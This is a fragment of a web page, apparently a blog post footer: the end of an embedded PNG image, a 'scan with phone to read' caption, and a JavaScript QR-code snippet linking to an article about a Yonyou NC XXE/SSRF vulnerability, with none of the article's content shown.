CrYNwCKqXtwJm3fwZQmogWH1eid4T5vpVHuKDYPfJYc5DOOzxciA2vfFnTmD3OcRlIdPzhsHM9ZnvvOur/JXPuo69rvJqYmljQF4DBMfc+HxVr3flU4esI+9onxHvd8h4Gh/wvH0OgUwTgk4Twt0rhJtX7xzig+Aqv6pXh9TL7QPR5YUQTe8Ky1sB8UOwtArrYNYrNwYkr1+EWYdwmFH/iPc7ZDyND3h+eSDjzahnyLR9DRAOQXURokNQvSPM+VqrQh8kX1qFemHxinqugHghWFoFhJe3orQKiF7PFZWrqOejqNxZWNM96uKYf3kgFt/4Z09gNxCn5bJyyO2BoHlR34qrd4S5X+8Dr+UhPniivVYI8bonfXKY8+oiJA/HqE+E+OQiRAfuvw95fNjP7h0Cz2kB23a9PR2Br++eNuOvB4iu/5e8gbq4JV58gLm/fQqvWkBqVz44zkN0CNZaZ9H7613pld8NpJtv/rMnsPykXtOq6NuB3A718lR0XlqFekeY+5iH6BCsHhU93znED5h6Gat/BdDe7WkB0ctTEfXx5YXkYI+PXz8w56pHxa/0BPc7ZDqO95Ptk3pNbIzV1vSYh3n6MHN91nWEcz8kbx+x9xm5HphrIVyvPnGlm4fUy7tf3vHKb77wfofUKXxQbH+GQKYPr6GvYXUbzEP6rfhV/VUe0h9wiSXaqxuA6c+D7pN37H3kkH5yEWYdwuGJ9zvE0/oQ3AbSp7/ir+7b+pUfcit63jqY8zBz6/QXqomlVcghPSBYuQrz9VwByatDOByjPrF6VMjF0io6L83YBqLpxveewG4g8NotcNsQv3yFEJ83YeV7VYf0gz3aA+aca4uQfOfWfxch/WDG3gfW+d1AevHNf/YE/thAILfAl+MtlHeE+CFoHsKtP0Nr9MhFSC/5yrfSe52+K7RO1C8f8Y8NZFzkfn79BP6zgcD57YPkIegtgZn3rXcfxA/B7i8OyVkrVm4MiG/U6hmOdftA8hCsmjEgOgR7nd6uA/ffhzw+7Gf3DnFqHVf77j65fnlHyO3RBzPXD9HlYq8DlJbYa+XA1yf1VeHKp24dzH3Mw6zrP8LdQI5Mt/ZzJ7ANBDJFOMerrUHquw+iQ9C8t6hziM88hENQfUR7vIqw7lV97QPxyUU41qu2Ao7zEB2C9ivcBlLkjvefwD2Q989g2sH/AAAA//+qG8u9AAAABklEQVQDAD5ZFtEot6ZWAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-saveProDefServlet-xxe-ssrf.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 